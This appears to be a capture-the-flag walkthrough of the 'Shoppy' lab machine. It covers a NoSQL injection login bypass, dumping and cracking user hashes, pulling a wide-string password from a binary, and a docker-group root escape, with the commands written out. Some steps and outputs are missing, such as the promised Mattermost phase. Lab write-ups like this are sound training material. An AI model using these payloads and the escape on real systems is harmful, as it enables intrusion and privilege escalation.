Phase 1

Initial Access — NoSQL Injection → Mattermost → SSH

NoSQL Injection on Login Page

The login form at http://shoppy.htb/login is backed by MongoDB. Standard SQL injection doesn't work, but NoSQL injection does:

# In Burp Suite, intercept the login POST and inject:
username=admin'||'1'=='1&password=admin

# This evaluates to: find({username: "admin" || "1"=="1"})
# which is always true → bypasses authentication
NoSQL Injection vs SQL Injection SQL injection uses ' OR 1=1--. NoSQL injection (MongoDB) uses JavaScript-style operators: '||'1'=='1 is a string concatenation that makes the condition always true. The single quotes break out of the string context, || is logical OR, and '1'=='1' is always true.

Dumping User Hashes

After logging into the admin panel, there's a "Search Users" feature — also injectable:

# In the search field, enter the same NoSQL injection:
admin'||'1'=='1

# Returns all users with their password hashes:
[
  {"username": "admin", "password": "23c6877d9e2b564ef8b32c3a23de27b2"},
  {"username": "josh",  "password": "6ebcea65320589ca4f2f1ce039975995"}
]

Cracking Josh's Hash

# MD5 hash — crack with CrackStation or hashcat
$ echo '6ebcea65320589ca4f2f1ce039975995' > hash.txt
$ hashcat -m 0 hash.txt /usr/share/wordlists/rockyou.txt
6ebcea65320589ca4f2f1ce039975995:remembermethisway

Phase 2

Lateral Movement — jaeger → deploy

Sudo Enumeration

jaeger@shoppy:~$ sudo -l
User jaeger may run the following commands on shoppy:

Reverse Engineering the Password Manager

The password manager binary is a C++ program. Download it for analysis:

$ scp jaeger@shoppy.htb:/home/deploy/password-manager ./

# The master password is stored as a UTF-16LE wide string
# Regular strings misses it — use -e l for little-endian 16-bit:
jaeger@shoppy:~$ strings -e l /home/deploy/password-manager
Sample
Why strings -e l? The password Sample is stored as a wide character (UTF-16LE) string in the binary. Regular strings only extracts single-byte ASCII. The -e l flag tells strings to look for 16-bit little-endian encoded characters — a common storage format in C++ programs using wchar_t. Alternatively, open the binary in Ghidra and look for wstring comparisons. 
jaeger@shoppy:~$ sudo -u deploy /home/deploy/password-manager

username: deploy

Phase 3

Privilege Escalation — Docker Group Escape

Group Membership

$ whoami
deploy
$ groups
deploy docker
Docker group = root Being in the docker group is effectively equivalent to having root access. Docker runs as root, and any user in the docker group can mount the host filesystem into a container. Since the container runs as root, you get root-level read/write access to every file on the host.

Docker Root Escape

# Check available images
$ docker images
REPOSITORY   TAG       IMAGE ID       CREATED       SIZE
alpine       latest    d7d3d98c851f   4 years ago   5.53MB

# Mount host root filesystem into container, then chroot into it
$ docker run -v /:/mnt --rm -it alpine chroot /mnt sh

# whoami
root

# cat /root/root.txt
8f2804f0e2f2e8975e2118f1f207ebd9
Breaking down the docker command docker run starts a new container. -v /:/mnt mounts the host's entire root filesystem (/) to /mnt inside the container. --rm auto-deletes the container on exit. -it gives an interactive terminal. alpine is the base image. chroot /mnt sh changes the container's root directory to /mnt (which is the host's /), then starts a shell — effectively giving you a root shell on the host.
Appendix

Key Takeaways

NoSQL injection uses different syntax than SQL injection.

MongoDB's JavaScript-based queries are vulnerable to '||'1'=='1 instead of SQL's ' OR 1=1--. Always test both when facing a login form.

Chat platforms leak credentials.

Mattermost, Slack, Discord — developers share passwords in chat all the time. After gaining access to any messaging platform, search for "password", "creds", "ssh", "token".

Wide strings hide from regular strings.

C++ programs using wchar_t or wstring store text as UTF-16. Use strings -e l for little-endian or Ghidra for proper analysis.

Docker group membership = root.

Any user in the docker group can mount the host filesystem and chroot into it. This is a well-known privilege escalation path — always check groups after getting a shell.

docker run -v /:/mnt ... chroot /mnt sh is the standard escape.

-v /:/mnt maps the host's root into the container, chroot /mnt makes it the new root directory. The container runs as root, so you have full root access to the host filesystem.
